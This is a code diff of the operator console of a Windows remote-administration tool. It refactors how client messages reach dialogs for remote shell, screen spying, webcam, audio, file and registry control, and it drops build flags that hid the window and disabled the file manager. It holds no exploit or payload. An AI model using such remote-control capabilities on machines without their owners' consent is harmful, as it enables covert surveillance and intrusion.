@@ -26,10 +26,6 @@
 
 #define UM_ICONNOTIFY WM_USER+100
 
-// 文件对话框数组（因为容易导致程序崩溃而出此策略）
-std::vector<CFileManagerDlg	*> v_FileDlg;
-// 注册表对话框数组（因为容易导致程序崩溃而出此策略）
-std::vector<CRegisterDlg	*> v_RegDlg;
 
 enum
 {
@@ -186,6 +182,7 @@ BEGIN_MESSAGE_MAP(CMy2015RemoteDlg, CDialogEx)
 	ON_MESSAGE(WM_OPENSERVICESDIALOG, OnOpenServicesDialog)
 	ON_MESSAGE(WM_OPENREGISTERDIALOG, OnOpenRegisterDialog)
 	ON_MESSAGE(WM_OPENWEBCAMDIALOG, OnOpenVideoDialog)
+	ON_MESSAGE(WM_HANDLEMESSAGE, OnHandleMessage)
 	ON_WM_HELPINFO()
 END_MESSAGE_MAP()
 
@@ -246,7 +243,6 @@ VOID CMy2015RemoteDlg::CreatStatusBar()
 
 VOID CMy2015RemoteDlg::CreateNotifyBar()
 {
-#if INDEPENDENT
 	m_Nid.cbSize = sizeof(NOTIFYICONDATA);     //大小赋值
 	m_Nid.hWnd = m_hWnd;           //父窗口    是被定义在父类CWnd类中
 	m_Nid.uID = IDR_MAINFRAME;     //icon  ID
@@ -256,7 +252,6 @@ VOID CMy2015RemoteDlg::CreateNotifyBar()
 	CString strTips ="禁界: 远程协助软件";       //气泡提示
 	lstrcpyn(m_Nid.szTip, (LPCSTR)strTips, sizeof(m_Nid.szTip) / sizeof(m_Nid.szTip[0]));
 	Shell_NotifyIcon(NIM_ADD, &m_Nid);   //显示托盘
-#endif
 }
 
 VOID CMy2015RemoteDlg::CreateToolBar()
@@ -438,10 +433,6 @@ BOOL CMy2015RemoteDlg::OnInitDialog()
 		return FALSE;
 	}
 
-#if !INDEPENDENT
-	ShowWindow(SW_SHOW);
-#endif
-
 	timeBeginPeriod(1);
 
 	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
@@ -454,12 +445,6 @@ void CMy2015RemoteDlg::OnSysCommand(UINT nID, LPARAM lParam)
 		CAboutDlg dlgAbout;
 		dlgAbout.DoModal();
 	}
-#if !INDEPENDENT
-	else if(nID == SC_CLOSE || nID == SC_MINIMIZE)
-	{
-		ShowWindow(SW_HIDE);
-	}
-#endif
 	else
 	{
 		CDialogEx::OnSysCommand(nID, lParam);
@@ -585,9 +570,8 @@ void CMy2015RemoteDlg::Release(){
 	OutputDebugStringA("======> Release\n");
 	isClosed = TRUE;
 	ShowWindow(SW_HIDE);
-#if INDEPENDENT
+
 	Shell_NotifyIcon(NIM_DELETE, &m_Nid);
-#endif
 
 	BYTE bToken = CLIENT_EXIT_WITH_SERVER ? COMMAND_BYE : SERVER_EXIT;
 	EnterCriticalSection(&m_cs);
@@ -599,32 +583,6 @@ void CMy2015RemoteDlg::Release(){
 	}
 	LeaveCriticalSection(&m_cs);
 	Sleep(200);
-
-	EnterCriticalSection(&m_cs);
-	/*
-	for (std::vector<CFileManagerDlg *>::iterator iter = v_FileDlg.begin(); 
-		iter != v_FileDlg.end(); ++iter)
-	{
-		CFileManagerDlg *cur = *iter;
-		::SendMessage(cur->GetSafeHwnd(), WM_CLOSE, 0, 0);
-		while (false == cur->m_bIsClosed)
-			Sleep(1);
-		delete cur;
-	}
-	*/
-	for (std::vector<CRegisterDlg *>::iterator iter = v_RegDlg.begin(); 
-		iter != v_RegDlg.end(); ++iter)
-	{
-		CRegisterDlg *cur = *iter;
-		::SendMessage(cur->GetSafeHwnd(), WM_CLOSE, 0, 0);
-		while (false == cur->m_bIsClosed)
-			Sleep(1);
-		delete cur;
-	}
-	LeaveCriticalSection(&m_cs);
-
-	//加上下面Sleep语句能避免不少退出时的崩溃、怀疑是IOCP需要背地干些工作
-	Sleep(300);
 
 	if (m_iocpServer!=NULL)
 	{
@@ -820,13 +778,8 @@ VOID CMy2015RemoteDlg::OnOnlineDesktopManager()
 
 VOID CMy2015RemoteDlg::OnOnlineFileManager()
 {
-#if INDEPENDENT
 	BYTE	bToken = COMMAND_LIST_DRIVE;    
 	SendSelectedCommand(&bToken, sizeof(BYTE));
-#else
-	if(m_CList_Online.GetFirstSelectedItemPosition())
-		ShowMessage(FALSE, "此功能已暂停使用");
-#endif
 }
 
 VOID CMy2015RemoteDlg::OnOnlineAudioManager()
@@ -963,7 +916,60 @@ BOOL CMy2015RemoteDlg::Activate(int nPort,int nMaxConnection)
 VOID CALLBACK CMy2015RemoteDlg::NotifyProc(CONTEXT_OBJECT* ContextObject)
 {
 	AUTO_TICK(20);
-	MessageHandle(ContextObject);
+
+	switch (ContextObject->v1)
+	{
+	case VIDEO_DLG:
+	{
+		CVideoDlg* Dlg = (CVideoDlg*)ContextObject->hDlg;
+		Dlg->OnReceiveComplete();
+		break;
+	}
+	case SERVICES_DLG:
+	{
+		CServicesDlg* Dlg = (CServicesDlg*)ContextObject->hDlg;
+		Dlg->OnReceiveComplete();
+		break;
+	}
+	case AUDIO_DLG:
+	{
+		CAudioDlg* Dlg = (CAudioDlg*)ContextObject->hDlg;
+		Dlg->OnReceiveComplete();
+		break;
+	}
+	case SYSTEM_DLG:
+	{
+		CSystemDlg* Dlg = (CSystemDlg*)ContextObject->hDlg;
+		Dlg->OnReceiveComplete();
+		break;
+	}
+	case SHELL_DLG:
+	{
+		CShellDlg* Dlg = (CShellDlg*)ContextObject->hDlg;
+		Dlg->OnReceiveComplete();
+		break;
+	}
+	case SCREENSPY_DLG:
+	{
+		CScreenSpyDlg* Dlg = (CScreenSpyDlg*)ContextObject->hDlg;
+		Dlg->OnReceiveComplete();
+		break;
+	}
+	case FILEMANAGER_DLG:
+	{
+		CFileManagerDlg* Dlg = (CFileManagerDlg*)ContextObject->hDlg;
+		Dlg->OnReceiveComplete();
+		break;
+	}
+	case REGISTER_DLG:
+	{
+		CRegisterDlg* Dlg = (CRegisterDlg*)ContextObject->hDlg;
+		Dlg->OnReceiveComplete();
+		break;
+	}
+	default:
+		g_2015RemoteDlg->PostMessage(WM_HANDLEMESSAGE, (WPARAM)ContextObject, (LPARAM)ContextObject);
+	}
 }
 
 // 对话框句柄及对话框类型
@@ -986,64 +992,15 @@ VOID CALLBACK CMy2015RemoteDlg::OfflineProc(CONTEXT_OBJECT* ContextObject)
 }
 
 
+LRESULT CMy2015RemoteDlg::OnHandleMessage(WPARAM wParam, LPARAM lParam) {
+	CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam;
+	MessageHandle(ContextObject);
+	return S_OK;
+}
+
+
 VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject) 
 {
-	if (ContextObject->v1 > 0)
-	{
-		switch(ContextObject->v1)
-		{
-		case VIDEO_DLG:
-			{
-				CVideoDlg *Dlg = (CVideoDlg*)ContextObject->hDlg;
-				Dlg->OnReceiveComplete();
-				break;
-			}
-		case SERVICES_DLG:
-			{
-				CServicesDlg *Dlg = (CServicesDlg*)ContextObject->hDlg;
-				Dlg->OnReceiveComplete();
-				break;
-			}
-		case AUDIO_DLG:
-			{
-				CAudioDlg *Dlg = (CAudioDlg*)ContextObject->hDlg;
-				Dlg->OnReceiveComplete();
-				break;
-			}
-		case SYSTEM_DLG:
-			{
-				CSystemDlg *Dlg = (CSystemDlg*)ContextObject->hDlg;
-				Dlg->OnReceiveComplete();
-				break;
-			}
-		case SHELL_DLG:
-			{
-				CShellDlg *Dlg = (CShellDlg*)ContextObject->hDlg;
-				Dlg->OnReceiveComplete();
-				break;
-			}
-		case SCREENSPY_DLG:
-			{
-				CScreenSpyDlg *Dlg = (CScreenSpyDlg*)ContextObject->hDlg;
-				Dlg->OnReceiveComplete();
-				break;
-			}
-		case FILEMANAGER_DLG:
-			{
-				CFileManagerDlg *Dlg = (CFileManagerDlg*)ContextObject->hDlg;
-				Dlg->OnReceiveComplete();
-				break;
-			}
-		case REGISTER_DLG:
-			{
-				CRegisterDlg *Dlg = (CRegisterDlg*)ContextObject->hDlg;
-				Dlg->OnReceiveComplete();
-				break;
-			}
-		}
-		return;
-	}
-
 	switch (ContextObject->InDeCompressedBuffer.GetBYTE(0))
 	{
 	case COMMAND_BYE:
@@ -1242,7 +1199,7 @@ LRESULT CMy2015RemoteDlg::OnUserOfflineMsg(WPARAM wParam, LPARAM lParam)
 		case REGISTER_DLG:
 			{
 				CRegisterDlg *Dlg = (CRegisterDlg*)p->hDlg;
-				//delete Dlg; //特殊处理
+				delete Dlg; //特殊处理
 				break;
 			}
 		default:break;
@@ -1395,21 +1352,6 @@ LRESULT CMy2015RemoteDlg::OnOpenRegisterDialog(WPARAM wParam, LPARAM lParam)
 
 	ContextObject->v1   = REGISTER_DLG;
 	ContextObject->hDlg = Dlg;
-	EnterCriticalSection(&m_cs);
-	for (std::vector<CRegisterDlg *>::iterator iter = v_RegDlg.begin(); 
-		iter != v_RegDlg.end(); )
-	{
-		CRegisterDlg *cur = *iter;
-		if (cur->m_bIsClosed)
-		{
-			delete cur;
-			iter = v_RegDlg.erase(iter);
-		}else{
-			++iter;
-		}
-	}
-	v_RegDlg.push_back(Dlg);
-	LeaveCriticalSection(&m_cs);
 
 	return 0;
 }
